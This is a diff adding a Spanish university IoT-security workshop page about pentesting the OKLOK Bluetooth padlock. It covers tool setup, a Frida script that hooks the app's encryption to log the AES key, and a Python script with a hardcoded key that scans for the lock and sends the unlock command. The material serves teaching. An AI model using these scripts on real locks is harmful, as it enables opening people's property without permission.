@@ -79,20 +79,212 @@
               <ul class="nav flex-column">
               </ul>
             </li>
+            
+            <li class="nav-item" data-level="1"><a href="#material-necesario" class="nav-link">Material necesario</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#virtualbox-ubuntu-mate-1804-64b" class="nav-link">VirtualBox Ubuntu Mate 18.04 64b</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#raspberry-pi-android-9-lineageos-160" class="nav-link">Raspberry Pi Android 9 (LineageOS 16.0)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#apks-y-utilidades" class="nav-link">Apks y utilidades</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
         </ul>
     </div>
 </div></div>
                     <div class="col-md-9" role="main">
 
 <h1 id="pentest-candado-bluetooth-oklok">Pentest candado Bluetooth OKLOK</h1>
-<p>El objetivo de este Test de Penetración (Pentest) consiste en ver si somos capaces de encontrar la clave de desbloqueo de un candado inteligente para poder abrirlo mediante conexión bluetooth sin permiso del usuario.</p>
+<p>El objetivo de este Test de Penetración (Pentest) consiste en ver si somos capaces de <strong>encontrar la clave de desbloqueo</strong> de un candado inteligente para poder <strong>abrirlo</strong> mediante conexión <strong>bluetooth</strong> sin permiso del usuario.</p>
 <p align="center">
 <img src="oklok.png"  width="60%" height="30%">
 </p>
 
-<p>El candado objetivo, modelo OKLOK Padlock, es un candado que se puede desbloquear mediante huella digital y usando una <a href="https://play.google.com/store/apps/details?id=com.oklok.lock&amp;hl=en&amp;gl=US">aplicación android</a> diseñada para tal efecto. </p>
-<p>Las versiones antiguas del candado tienen una vulnerabilidad conocida y documentada (<a href="https://eprints.ucm.es/62476/1/JESUS_ALBERTO_TEJEDOR_DORIA_Entrega_Final_TFM_Pentesting_Device_IoT_Smart_Doorlock_4286353_1929042718.pdf">TFM Jesus Alberto Tejedor Doria, 2020</a>) que permitía averiguar la clave de desbloqueo de una manera relativamente sencilla. Sin embargo, el fabricante ha actualizado la aplicación complicando la obtención de dicha clave.</p>
-<p>El objetivo de este taller consiste en ser capaces de encontrar la clave de acceso mediante el estudio e instrumentación de la nueva aplicación. Para ello os explicaré cómo se conseguía la clave usando la aplicación antigua, con la esperanza de que algún hacker sea capaz de obtener claves nuevas de los candados que tenemos en la FDI.</p></div>
+<p>El candado objetivo, modelo <strong>OKLOK Padlock</strong>, es un candado que se puede desbloquear mediante huella digital y usando una <a href="https://play.google.com/store/apps/details?id=com.oklok.lock&amp;hl=en&amp;gl=US">App Android</a> diseñada para tal efecto. </p>
+<p>Las versiones antiguas del candado tienen una vulnerabilidad conocida y documentada (<a href="https://eprints.ucm.es/62476/1/JESUS_ALBERTO_TEJEDOR_DORIA_Entrega_Final_TFM_Pentesting_Device_IoT_Smart_Doorlock_4286353_1929042718.pdf">TFM Jesus Alberto Tejedor Doria, 2020</a>, basado en <a href="https://www.attify.com/iot-security-pentesting">Attify Pentest kit</a>) que permitía <strong>averiguar la clave</strong> de desbloqueo de una manera relativamente sencilla. Sin embargo, el fabricante ha <strong>actualizado la aplicación de Android</strong>, complicando la obtención de dicha clave.</p>
+<p>El objetivo de este taller consiste en ser capaces de encontrar la clave de acceso mediante el estudio e instrumentación de la nueva aplicación. Para ello os explicaré cómo se conseguía la clave usando la aplicación antigua (<a href="Pentest_Lock.pdf">M-IoT S&amp;L P2: Pentest_Lock</a>), con la esperanza de que algún hacker sea capaz de obtener claves nuevas de los candados que tenemos en la FDI y así poder volver a utilizar la práctica dentro de la asignatura Seguridad y Legalidad del Máster de IoT. </p>
+<h1 id="material-necesario">Material necesario</h1>
+<p>Para intentar replicar el hack necesitaremos un ordenador con Linux instalado y un dispositivo Android <em>rooteado</em>. Para facilitar la tarea os dejo una imagen de una máquina virtual de <strong>Ubuntu Mate</strong> y una imagen de <strong>Android para Raspberry Pi 4</strong>.</p>
+<h2 id="virtualbox-ubuntu-mate-1804-64b">VirtualBox Ubuntu Mate 18.04 64b</h2>
+<p>En este enlace  <a href="https://drive.google.com/file/d/1eo9bX2aVQekpQcAm2UmuF1QA5-_ZrvyT/view?usp=share_link">Ubuntu Mate 18.04.1 64b</a> os dejo una MV preparada con todo lo que listo a continuación. Para poder descargar el fichero deberéis de estar <strong>identificados</strong> con la cuenta de correo de la <strong>UCM</strong>.</p>
+<ul>
+<li>
+<p>Usuario/contraseña: <code>master_iot</code>/<code>SyL</code></p>
+</li>
+<li>
+<p>Paquetes instalados sobre la versión <em>stock</em>:</p>
+</li>
+</ul>
+<pre><code class="language-bash">sudo apt-get install ubertooth
+sudo apt-get install python-pip libglib2.0-dev python-dev
+sudo pip install bluepy
+sudo pip install pycrypto
+sudo pip install pyaes
+sudo apt install aapt
+sudo apt install apktool
+sudo apt install zipalign
+sudo apt install python3-pip
+sudo pip3 install objection
+sudo apt install adb 
+sudo apt install default-jdk
+</code></pre>
+<ul>
+<li>Acceso a unidades compartidas con el Host:</li>
+</ul>
+<pre><code class="language-bash">sudo adduser masteriot vboxsf
+</code></pre>
+<ul>
+<li>
+<p>La versión de <code>apk-tool</code> del repositorio (<em>v.v2.4.0-dirty</em>) no parece valerle a <code>objection</code>: <strong>Error</strong> <em>apktool version should be at least 2.4.1</em>.
+  Copiamos <a href="https://ibotpeaches.github.io/Apktool/install/">apk-tool v2.4.1</a> en <code>~/bin</code> y mantenemos el paquete, ya que instala algo necesario (no he localizado el qué).</p>
+</li>
+<li>
+<p><a href="https://launchpad.net/~wireshark-dev/+archive/ubuntu/stable"><em>Wireshark</em> actualizado</a> y sin privilegios (requiere <code>logout</code>). Wireshark permite monitorizar la red del Host si se configura en modo <code>bridged</code> y con la configuración <code>Promiscuous mode: Allow all.</code></p>
+</li>
+</ul>
+<pre><code class="language-bash">sudo add-apt-repository ppa:wireshark-dev/stable
+sudo apt-get update
+sudo apt-get install wireshark
+sudo dpkg-reconfigure wireshark-common
+sudo addgroup masteriot wireshark
+</code></pre>
+<ul>
+<li><a href="https://www.bettercap.org/">Bettercap</a>:<ul>
+<li>Descargar y copiar el binario precompilado en <code>/sbin/</code>, necesita librerías</li>
+</ul>
+</li>
+<li><a href="https://github.com/skylot/jadx">Jadx</a>:<ul>
+<li>Descargar y copiar en <code>/opt/jadx-1.1.0</code></li>
+<li><strong>Nota:</strong> este programa consume muchos recursos, asignar 4GiB y 2 CPUs en la MV</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">sudo apt-get install libpcap-dev libnetfilter-queue-dev
+</code></pre>
+<h2 id="raspberry-pi-android-9-lineageos-160">Raspberry Pi Android 9 (LineageOS 16.0)</h2>
+<ul>
+<li>Enlace a la imagen original <a href="https://drive.google.com/file/d/1FepSgPTNmIe9RXJRf8kPZBdfw4rda9RY/view?usp=share_link">LineageOS 16.0</a>. Para poder descargar el fichero deberéis de estar <strong>identificados</strong> con la cuenta de correo de la <strong>UCM</strong>.</li>
+<li>Manual: <a href="https://konstakang.com/devices/rpi3/LineageOS16.0/">LineageOS 16.0 (Android 9)</a></li>
+<li>Necesario conectar un monitor HDMI sin adaptador, o configurar a mano la resolución según manual.</li>
+<li>Pasos del manual necesarios:<ul>
+<li>Habilitar opciones de desarrollador</li>
+<li>Habilitar acceso de <em>root</em></li>
+</ul>
+</li>
+<li>Otras consideraciones:<ul>
+<li>Botón de apagado: F5</li>
+<li>Es necesario activar <em>adb</em> por red</li>
+<li>Habilitar log bluetooth</li>
+</ul>
+</li>
+<li>Servidor frida:  <a href="frida-server-14.2.8-android-arm">frida-server-14.2.8-android-arm</a> </li>
+</ul>
+<h2 id="apks-y-utilidades">Apks y utilidades</h2>
+<p>Os dejo dos versiones antiguas de la <strong>App Oklok</strong> que no están muy ofuscadas:
+*  <a href="oklok_v1.3.0.apk">oklok_v1.3.0.apk</a> 
+*  <a href="oklok_v1.5.7.apk">oklok_v1.5.7.apk</a> </p>
+<p>Script para <strong>conseguir la clave</strong> mediante Frida:</p>
+<pre><code class="language-java">Java.perform(function () 
+{
+    var CMDUtils = Java.use('com.coolu.blelibrary.utils.CMDUtils');
+
+    var log_byte_array = function (arr) {
+        var result = &quot;&quot;;
+        var buffer = Java.array('byte', arr);
+        for(var i = 0; i &lt; buffer.length; ++i)  {
+            var hexb = (buffer[i] &amp; 0xFF).toString(16);
+            if (hexb.length == 1) hexb = '0' + hexb;
+            result += hexb;
+        }
+        console.log(result);
+    };
+
+    CMDUtils.Encrypt.implementation = function (pt, key) {
+        console.log('[+] Inside Encrypt()  ======');
+        var ct = this.Encrypt(pt, key);
+        console.log('Pt:')
+        log_byte_array(pt)
+        console.log('key:')
+        log_byte_array(key);
+        return ct;
+    };
+
+    CMDUtils.Decrypt.implementation = function (ct, key) {
+        console.log('[+] Inside Decrypt()  ======');
+        var pt = this.Decrypt(ct, key);
+        console.log('Pt:')
+        log_byte_array(pt)
+        console.log('Key:')
+        log_byte_array(key);
+        return pt;
+    };
+});
+</code></pre>
+<p>Script <strong>Python 2</strong> para abrir el candado (una vez que <strong>conocemos la clave AES</strong>):</p>
+<pre><code class="language-python">from bluepy.btle import Scanner, Peripheral, DefaultDelegate
+from Crypto.Cipher import AES
+
+AESKEY = '034100624f0a29355c193f1a39192356'
+
+class MyDelegate(DefaultDelegate):
+    def __init__(self):
+        DefaultDelegate.__init__(self)
+        self.token = None
+    def handleNotification(self, cHandle, data):
+        cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB)
+        pt = cipher.decrypt(data)
+
+        if pt.startswith('\x06\x02\x07'):
+            self.token = pt[3:7]
+            print '[+] Token:', self.token.encode('hex')
+def connect(addr):
+    print '[+] Connecting'
+    p = Peripheral(addr)
+
+    write_char = p.getCharacteristics(uuid='000036f5-0000-1000-8000-00805f9b34fb')[0]
+    notify_char = p.getCharacteristics(uuid='000036f6-0000-1000-8000-00805f9b34fb')[0]  
+
+    # Enable notifications, https://stackoverflow.com/a/15722811
+    p.writeCharacteristic(7, '0100'.decode('hex'), withResponse=True)
+
+    d = MyDelegate()
+    p.withDelegate(d)
+
+    gettokencmd = '06010101' + '0'*24
+    gettokstr = AES.new(AESKEY.decode('hex'), AES.MODE_ECB).encrypt(gettokencmd.decode('hex'))
+
+    print '[+] Sending GET_TOKEN command'
+    write_char.write(gettokstr, withResponse=True)
+
+    p.waitForNotifications(2)
+
+    if d.token != None:
+        cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB)
+
+        # Send unlock command
+        pt = '050106303030303030'.decode('hex') + d.token + '\x00\x00\x00'      
+        write_char.write(cipher.encrypt(pt))
+        print '[+] Sent unlock command'
+def main():
+    s = Scanner()
+    print '[+] Scanning for 5s...'
+    s.scan(5)
+
+    for dev in s.getDevices():  
+        if dev.getValueText(0x9) == 'BlueFPL':
+            print '[+] Found OKLOK'
+            connect(dev.addr)
+            break            
+if __name__ == '__main__':
+    main()
+</code></pre></div>
             </div>
         </div>
 
